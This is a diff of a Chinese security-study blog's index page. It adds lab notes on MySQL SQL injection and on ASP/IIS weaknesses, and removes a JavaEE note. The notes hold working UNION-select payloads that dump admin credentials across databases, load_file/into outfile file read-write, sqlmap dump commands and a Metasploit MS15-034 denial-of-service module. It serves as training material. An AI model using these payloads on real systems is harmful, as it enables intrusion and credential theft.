@@ -201,6 +201,258 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/19/42WEB%E6%94%BB%E9%98%B2-SQL%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="z7">
+      <meta itemprop="description" content="师从小迪，欢迎各位来当迪总的韭菜">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/10/19/42WEB%E6%94%BB%E9%98%B2-SQL%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">42WEB攻防-SQL注入</a>
+        </h2>
+
+        <div class="post-meta">
+	
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-10-19 21:48:05" itemprop="dateCreated datePublished" datetime="2023-10-19T21:48:05+08:00">2023-10-19</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-11-06 21:25:02" itemprop="dateModified" datetime="2023-11-06T21:25:02+08:00">2023-11-06</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>5k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>5 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a target="_blank" rel="noopener" href="http://z7yy.top/2023/10/18/41WEB%E6%94%BB%E9%98%B2-ASP%E5%BA%94%E7%94%A8/">41WEB攻防</a></p>
+<h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul>
+<li>4、PHP-MYSQL-SQL注入-常规查询</li>
+<li>5、PHP-MYSQL-SQL注入-跨库查询</li>
+<li>6、PHP-MYSQL-SQL注入-文件读写</li>
+</ul>
+<h2 id="章节点："><a href="#章节点：" class="headerlink" title="章节点："></a>章节点：</h2><p>Web层面：Web2.0 &amp; Web3.0<br>语言安全：JS，ASP，PHP，NET，Java，Python等（包含框架类）<br>OWTOP10：注入，文件安全，XSS，RCE，XXE，CSRF，SSRF，反序列化，未授权访问等<br>业务逻辑：水平垂直越权，支付签约&amp;购买充值，找回机制，数据并发，验证码&amp;弱口令等<br>特殊漏洞：JWT，CRLF，CORS，重定向，JSONP回调，域名接管，DDOS，接口枚举等<br>关键技术：POP链构造，JS逆向调试，NET反编译，JAVA反编译，代码解密，数据解密等<br>Web3.0：未待完续筹备中….  </p>
+<h2 id="MYSQL注入：（目的获取当前web权限）"><a href="#MYSQL注入：（目的获取当前web权限）" class="headerlink" title="MYSQL注入：（目的获取当前web权限）"></a>MYSQL注入：（目的获取当前web权限）</h2><p>1、判断常见四个信息（系统，用户，数据库名，版本）<br>2、根据四个信息去选择方案<br>root用户：先测试读写，后测试获取数据<br>非root用户：直接测试获取数据  </p>
+<h2 id="PHP-MYSQL-Web组成架构"><a href="#PHP-MYSQL-Web组成架构" class="headerlink" title="PHP-MYSQL-Web组成架构"></a>PHP-MYSQL-Web组成架构</h2><p>服务器安装MYSQL数据库，搭建多个站点，数据库集中存储MYSQL数据库中管理<br>可以都使用root用户管理也可以创建多个用户进行每个网站对应的数据库管理  </p>
+<ul>
+<li>1、统一交root用户管理<br><a target="_blank" rel="noopener" href="http://www.zblog.com/">www.zblog.com</a>  &#x3D; zblog  &#x3D; root &#x3D;&gt;MYSQL<br><a target="_blank" rel="noopener" href="http://www.demo01.com/">www.demo01.com</a> &#x3D; demo01 &#x3D; root &#x3D;&gt;MYSQL  </li>
+<li>2、一对一用户管理（推荐）<br><a target="_blank" rel="noopener" href="http://www.zblog.com/">www.zblog.com</a>  &#x3D; zblog  &#x3D; zblog &#x3D;&gt;MYSQL<br><a target="_blank" rel="noopener" href="http://www.demo01.com/">www.demo01.com</a> &#x3D; demo01 &#x3D; demo01 &#x3D;&gt;MYSQL</li>
+</ul>
+<h2 id="PHP-MYSQL-SQL常规查询"><a href="#PHP-MYSQL-SQL常规查询" class="headerlink" title="PHP-MYSQL-SQL常规查询"></a>PHP-MYSQL-SQL常规查询</h2><p>获取相关数据：<br>1、数据库版本-看是否符合information_schema查询 - version()<br>2、数据库用户-看是否符合ROOT型注入攻击 - user()<br>3、当前操作系统-看是否支持大小写或文件路径选择 - @@version_compile_os<br>4、数据库名字-为后期猜解指定数据库下的表，列做准备 - database()  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">MYSQL5.0以上版本：自带的数据库名information_schema  </span><br><span class="line">information_schema：存储数据库下的数据库名及表名，列名信息的数据库  </span><br><span class="line">information_schema.schemata：记录数据库名信息的表  </span><br><span class="line">information_schema.tables：记录表名信息的表  </span><br><span class="line">information_schema.columns：记录列名信息表  </span><br><span class="line">schema_name：information_schema.schemata记录数据库名信息的列名值  </span><br><span class="line">table_schema：information_schema.tables记录数据库名的列名值  </span><br><span class="line">table_name：information_schema.tables记录表名的列名值  </span><br><span class="line">column_name：information_schema.columns记录列名的列名值  </span><br><span class="line"></span><br><span class="line">order by 6 </span><br><span class="line">union select 1,2,3,4,5,6</span><br><span class="line">union select 1,2,3,database(),user(),6</span><br><span class="line">union select 1,2,3,version(),@@version_compile_os,6</span><br><span class="line">union select 1,2,3,4,group_concat(table_name),6 from information_schema.tables where table_schema=&#x27;demo01&#x27;</span><br><span class="line">union select 1,2,3,4,group_concat(column_name),6 from information_schema.columns where table_name=&#x27;admin&#x27;</span><br><span class="line">union select 1,2,3,username,password,6 from admin limit 0,1</span><br></pre></td></tr></table></figure>
+<h2 id="PHP-MYSQL-SQL跨库查询"><a href="#PHP-MYSQL-SQL跨库查询" class="headerlink" title="PHP-MYSQL-SQL跨库查询"></a>PHP-MYSQL-SQL跨库查询</h2><p>影响条件：当前数据库ROOT用户权限<br>测试不同数据库用户：root demo   </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,3,4,group_concat(schema_name),6 from information_schema.schemata</span><br><span class="line">union select 1,2,3,4,group_concat(table_name),6 from information_schema.tables where table_schema=&#x27;zblog&#x27;</span><br><span class="line">union select 1,2,3,4,group_concat(column_name),6 from information_schema.columns where table_name=&#x27;zbp_member&#x27; and table_schema=&#x27;zblog&#x27;</span><br><span class="line">union select 1,2,3,mem_Name,mem_Password,6 from zblog.zbp_member</span><br></pre></td></tr></table></figure>
+<h2 id="PHP-MYSQL-SQL文件读写"><a href="#PHP-MYSQL-SQL文件读写" class="headerlink" title="PHP-MYSQL-SQL文件读写"></a>PHP-MYSQL-SQL文件读写</h2><p>影响条件：<br>1、当前数据库用户权限<br>2、secure-file-priv设置<br>测试不同数据库用户：root demo  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">union select 1,load_file(&#x27;d:\\1.txt&#x27;),3,4,5,6</span><br><span class="line">union select 1,&#x27;xiaodi&#x27;,3,4,5,6 into outfile &#x27;d:\\2.txt&#x27;</span><br></pre></td></tr></table></figure>
+<p>读写的路径的问题：<br>1、报错显示获取路径<br>2、phpinfo页面泄漏<br>如果不知道路径思路：<br>利用常见的默认的中间件，数据库等安装路径读取有价值信息<br>[<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_30795127/article/details/96558708]">https://blog.csdn.net/weixin_30795127/article/details/96558708]</a>  </p>
+<p>access无数据库用户<br>mysql里面有内置的管理用户，其中root就是默认数据库管理员用户<br>网站上面的数据库都在mysql中，由root或一对一用户去管理  </p>
+<h2 id="1、数据库统一管理（root用户）"><a href="#1、数据库统一管理（root用户）" class="headerlink" title="1、数据库统一管理（root用户）"></a>1、数据库统一管理（root用户）</h2><p>每个网站的数据库都由root用户统一管理<br>网站A：192.168.1.4:81  D:&#x2F;phpstudy_pro&#x2F;WWW&#x2F;Z-Blog  数据库root用户  zblog<br>网站B：192.168.1.4:82  D:&#x2F;phpstudy_pro&#x2F;WWW&#x2F;demo01  数据库root用户  demo01  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql</span><br><span class="line">	root(自带默认)</span><br><span class="line">		网站A  testA</span><br><span class="line">		网站B  testB</span><br></pre></td></tr></table></figure>
+
+<h2 id="2、数据库一对一管理（不同用户）"><a href="#2、数据库一对一管理（不同用户）" class="headerlink" title="2、数据库一对一管理（不同用户）"></a>2、数据库一对一管理（不同用户）</h2><p>自己的网站单独创建数据库用户去管理自己的数据库<br>网站A：192.168.1.4:81  D:&#x2F;phpstudy_pro&#x2F;WWW&#x2F;Z-Blog  数据库zblog用户  zblog<br>网站B：192.168.1.4:82  D:&#x2F;phpstudy_pro&#x2F;WWW&#x2F;demo01  数据库demo用户  demo01  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql</span><br><span class="line">	testA用户</span><br><span class="line">		网站A  testA</span><br><span class="line">	testb用户</span><br><span class="line">		网站B  testB</span><br></pre></td></tr></table></figure>
+
+<p>接受的参数值未进行过滤直接带入SQL查询的操作 就是SQL注入产生的原理攻击：利用SQL语句执行你想要的东西（SQL语句能干嘛，注入就能干嘛）<br>SQL语句能干嘛 &#x3D; SQL语句由谁决定 &#x3D;&gt; 数据库类型决定 (为什么mysql注入 oracle注入叫法原因)  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:63342/demo01/new.php?id=3</span><br><span class="line">select * from news where id=3</span><br><span class="line"></span><br><span class="line">http://localhost:63342/demo01/new.php?id=3 union select 1,2,username,password,5,6 from admin</span><br><span class="line">select * from news where id=3 union select 1,2,username,password,5,6 from admin</span><br></pre></td></tr></table></figure>
+<p>access注入 sqlmap  靠字典去猜 又可能猜不到表名 列名  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql</span><br><span class="line">	demo01</span><br><span class="line">		admin</span><br><span class="line">			username,password,id</span><br><span class="line">				数据</span><br><span class="line">	Zblog</span><br><span class="line">		zbp_member</span><br><span class="line">			mem_Name,mem_Password</span><br><span class="line">				数据</span><br><span class="line">Access（单个）</span><br><span class="line">	表名</span><br><span class="line">		列名（字段）</span><br><span class="line">			数据</span><br></pre></td></tr></table></figure>
+<p>目的：获取数据<br>肯定一步步得到信息  </p>
+<p>查询数据库名demo01下的表名信息（借助information_schema.tables存储查询）  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.4:82/new.php?id=1 union select 1,2,3,group_concat(table_name),5,6 from information_schema.tables where table_schema=&#x27;demo01&#x27;</span><br></pre></td></tr></table></figure>
+<p>查询数据库名demo01下的表名admin的列名信息（借助information_schema.columns存储查询）  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.4:82/new.php?id=1 union select 1,2,3,group_concat(column_name),5,6 from information_schema.columns where table_schema=&#x27;demo01&#x27; and table_name=&#x27;admin&#x27;</span><br></pre></td></tr></table></figure>
+<h2 id="跨库查询："><a href="#跨库查询：" class="headerlink" title="跨库查询："></a>跨库查询：</h2><ul>
+<li><p>1、数据库统一管理（root用户）<br>每个网站的数据库都由root用户统一管理<br>网站A：192.168.1.4:81  D:&#x2F;phpstudy_pro&#x2F;WWW&#x2F;Z-Blog  数据库root用户  zblog<br>网站B：192.168.1.4:82  D:&#x2F;phpstudy_pro&#x2F;WWW&#x2F;demo01  数据库root用户  demo01  </p>
+</li>
+<li><p>2、跨库注入<br>通过B网站的注入点获取A网站的账号密码</p>
+</li>
+</ul>
+<p>获取mysql下所有数据库名：  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.4:82/new.php?id=1 union select 1,2,3,group_concat(schema_name),5,6 from information_schema.schemata</span><br><span class="line"></span><br><span class="line">http://192.168.1.4:82/new.php?id=1 union select 1,2,3,group_concat(table_name),5,6 from information_schema.tables where table_schema=&#x27;zblog&#x27;</span><br><span class="line"></span><br><span class="line">http://192.168.1.4:82/new.php?id=1 union select 1,2,3,group_concat(column_name),5,6 from information_schema.columns where table_schema=&#x27;zblog&#x27; and table_name=&#x27;zbp_member&#x27;</span><br></pre></td></tr></table></figure>
+<p>解决：单引号过滤绕过方式<br>SQL注入语句中用单引号就不要编码，编码就不用单引号（路径，表名，数据库名等）  </p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+
+ 
+
+      
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/18/41WEB%E6%94%BB%E9%98%B2-ASP%E5%BA%94%E7%94%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="z7">
+      <meta itemprop="description" content="师从小迪，欢迎各位来当迪总的韭菜">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/10/18/41WEB%E6%94%BB%E9%98%B2-ASP%E5%BA%94%E7%94%A8/" class="post-title-link" itemprop="url">41WEB攻防-ASP应用</a>
+        </h2>
+
+        <div class="post-meta">
+	
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-10-18 16:11:27" itemprop="dateCreated datePublished" datetime="2023-10-18T16:11:27+08:00">2023-10-18</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-11-06 20:50:14" itemprop="dateModified" datetime="2023-11-06T20:50:14+08:00">2023-11-06</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>2.4k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>2 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p> <img src="/2023/10/18/41WEB%E6%94%BB%E9%98%B2-ASP%E5%BA%94%E7%94%A8/image4.png"></p>
+<h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul>
+<li>1、ASP-SQL注入-Access数据库</li>
+<li>2、ASP-默认安装-数据库泄漏下载</li>
+<li>3、ASP-IIS-CVE&amp;短文件&amp;解析&amp;写入</li>
+</ul>
+<h2 id="章节点："><a href="#章节点：" class="headerlink" title="章节点："></a>章节点：</h2><p>Web层面：Web2.0 &amp; Web3.0<br>语言安全：JS，ASP，PHP，NET，Java，Python等（包含框架类）<br>OWTOP10：注入，文件安全，XSS，RCE，XXE，CSRF，SSRF，反序列化，未授权访问等<br>业务逻辑：水平垂直越权，支付签约&amp;购买充值，找回机制，数据并发，验证码&amp;弱口令等<br>特殊漏洞：JWT，CRLF，CORS，重定向，JSONP回调，域名接管，DDOS，接口枚举等<br>关键技术：POP链构造，JS逆向调试，NET反编译，JAVA反编译，代码解密，数据解密等<br>Web3.0：未待完续筹备中….  </p>
+<h2 id="ASP-默认安装-MDB数据库泄漏下载"><a href="#ASP-默认安装-MDB数据库泄漏下载" class="headerlink" title="ASP-默认安装-MDB数据库泄漏下载"></a>ASP-默认安装-MDB数据库泄漏下载</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由于大部分ASP程序与ACCESS数据库搭建，但ACCESS无需连接，都在脚本文件中定义配置好数据库路径即用，不需要额外配置安装数据库，所以大部分提前固定好的数据库路径如默认未修改，当攻击者知道数据库的完整路径，可远程下载后解密数据实现攻击。  </p>
+<h2 id="ASP-中间件-CVE-短文件-解析-写权限"><a href="#ASP-中间件-CVE-短文件-解析-写权限" class="headerlink" title="ASP-中间件-CVE&amp;短文件&amp;解析&amp;写权限"></a>ASP-中间件-CVE&amp;短文件&amp;解析&amp;写权限</h2><h3 id="HTTP-SYS（CVE-2015-1635）"><a href="#HTTP-SYS（CVE-2015-1635）" class="headerlink" title="HTTP.SYS（CVE-2015-1635）"></a>HTTP.SYS（CVE-2015-1635）</h3><ul>
+<li>1、漏洞描述<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;远程执行代码漏洞存在于 HTTP 协议堆栈 (HTTP.sys) 中，当 HTTP.sys 未正确分析经特殊设计的 HTTP 请求时会导致此漏洞。 成功利用此漏洞的攻击者可以在系统帐户的上下文中执行任意代码。</li>
+<li>2、影响版本<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Windows 7、Windows Server 2008 R2、Windows 8、Windows Server 2012、Windows 8.1 和 Windows Server 2012 R2</li>
+<li>3、漏洞利用条件<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;安装了IIS6.0以上的Windows 7、Windows Server 2008 R2、Windows 8、Windows Server 2012、Windows 8.1 和 Windows Server 2012 R2版本</li>
+<li>4、漏洞复现(kali)  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msfconsole  </span><br><span class="line">use auxiliary/dos/http/ms15_034_ulonglongadd</span><br><span class="line">set rhosts xx.xx.xx.xx</span><br><span class="line">set rport xx</span><br><span class="line">run</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="IIS短文件"><a href="#IIS短文件" class="headerlink" title="IIS短文件"></a>IIS短文件</h3><ul>
+<li>1、描述：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;此漏洞实际是由HTTP请求中旧DOS 8.3名称约定(SFN)的代字符(~)波浪号引起的。它允许远程攻击者在Web根目录下公开文件和文件夹名称(不应该可被访问)。攻击者可以找到通常无法从外部直接访问的重要文件,并获取有关应用程序基础结构的信息。</li>
+<li>2、漏洞成因:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;为了兼容16位MS-DOS程序,Windows为文件名较长的文件(和文件夹)生成了对应的windows 8.3短文件名。在Windows下查看对应的短文件名,可以使用命令dir &#x2F;x</li>
+<li>3、应用场景：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;后台路径获取，数据库文件获取，其他敏感文件获取等</li>
+<li>4、利用工具：<br><a target="_blank" rel="noopener" href="https://github.com/irsdl/IIS-ShortName-Scanner">https://github.com/irsdl/IIS-ShortName-Scanner</a><br><a target="_blank" rel="noopener" href="https://github.com/lijiejie/IIS_shortname_Scanner">https://github.com/lijiejie/IIS_shortname_Scanner</a></li>
+</ul>
+<h3 id="IIS文件解析"><a href="#IIS文件解析" class="headerlink" title="IIS文件解析"></a>IIS文件解析</h3><p>IIS 6 解析漏洞<br>1、该版本默认会将*.asp;.jpg 此种格式的文件名，当成Asp解析<br>2、该版本默认会将*.asp&#x2F;目录下的所有文件当成Asp解析。<br>如：logo.asp;.jpg xx.asp&#x2F;logo.jpg<br>IIS 7.x 解析漏洞<br>在一个文件路径(&#x2F;xx.jpg)后面加上&#x2F;xx.php会将&#x2F;xx.jpg&#x2F;xx.php 解析为php文件<br>应用场景：配合文件上传获取Webshell  </p>
+<h3 id="IIS写权限"><a href="#IIS写权限" class="headerlink" title="IIS写权限"></a>IIS写权限</h3><p>IIS&lt;&#x3D;6.0 目录权限开启写入，开启WebDAV，设置为允许<br>参考利用：<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2050105">https://cloud.tencent.com/developer/article/2050105</a>  </p>
+<h2 id="ASP-SQL注入-SQLMAP使用-ACCESS注入"><a href="#ASP-SQL注入-SQLMAP使用-ACCESS注入" class="headerlink" title="ASP-SQL注入-SQLMAP使用&amp;ACCESS注入"></a>ASP-SQL注入-SQLMAP使用&amp;ACCESS注入</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ACCESS数据库无管理帐号密码，顶级架构为表名，列名（字段），数据，所以在注入猜解中一般采用字典猜解表和列再获取数据，猜解简单但又可能出现猜解不到的情况，由于Access数据库在当前安全发展中已很少存在，故直接使用SQLMAP注入，后续再说其他。  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;&quot; --tables //获取表名</span><br><span class="line">python sqlmap.py -u &quot;&quot; --columns -T admin //获取admin表名下的列名</span><br><span class="line">python sqlmap.py -u &quot;&quot; --dump -C &quot;&quot; -T admin  //获取表名下的列名数据</span><br></pre></td></tr></table></figure>
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+
+ 
+
+      
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/18/40%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE%E5%BA%94%E7%94%A8/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1195,260 +1447,10 @@
 
  
 
-      
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/18/32%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE%E5%BA%94%E7%94%A8/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="z7">
-      <meta itemprop="description" content="师从小迪，欢迎各位来当迪总的韭菜">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/10/18/32%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE%E5%BA%94%E7%94%A8/" class="post-title-link" itemprop="url">32安全开发-JavaEE应用</a>
-        </h2>
-
-        <div class="post-meta">
-	
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-10-18 10:36:49" itemprop="dateCreated datePublished" datetime="2023-10-18T10:36:49+08:00">2023-10-18</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-11-06 21:10:32" itemprop="dateModified" datetime="2023-11-06T21:10:32+08:00">2023-11-06</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>2.5k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>2 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a target="_blank" rel="noopener" href="http://z7yy.top/2023/10/07/22%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-php%E5%BA%94%E7%94%A8/">22安全开发</a></p>
-<h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul>
-<li>27、JavaEE-HTTP-Servlet技术  </li>
-<li>28、JavaEE-数据库-JDBC&amp;Mybatis</li>
-</ul>
-<h2 id="章节点"><a href="#章节点" class="headerlink" title="章节点"></a>章节点</h2><ul>
-<li>1、PHP：<br>功能：新闻列表，会员中心，资源下载，留言版，后台模块，模版引用，框架开发等<br>技术：输入输出，超全局变量，数据库操作，逻辑架构，包含上传&amp;下载删除;<br>技术：JS&amp;CSS混用，Cookie,Session操作，MVC架构，ThinkPHP引用等。<br>安全：原生PHP开发安全，模版引用安全，第三方插件安全，TP框架安全等  </li>
-<li>2、JS：<br>功能：登录验证，文件操作，SQL操作，云应用接入，框架开发，打包器使用等<br>技术：原生开发，DOM，常见库使用，框架开发（Vue，NodeJS），打包器(Webpack)等<br>安全：原生开发安全，NodeJS安全，Vue安全，打包器Webpack安全，三方库安全问题等  </li>
-<li>3、Java：<br>功能：数据库操作，文件操作，序列化数据，身份验证，框架开发，第三方库使用等.<br>框架库：MyBatis，SpringMVC，SpringBoot，Shiro，Log4j，FastJson等<br>技术：Servlet，Listen，Filter，Interceptor，JWT，AOP，待补充<br>安全：SQL注入，RCE执行，反序列化，脆弱验证，未授权访问，待补充<br>安全：原生开发安全，第三方框架安全，第三方库安全等，待补充</li>
-</ul>
-<p> <img src="/2023/10/18/32%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE%E5%BA%94%E7%94%A8/servlet.png"></p>
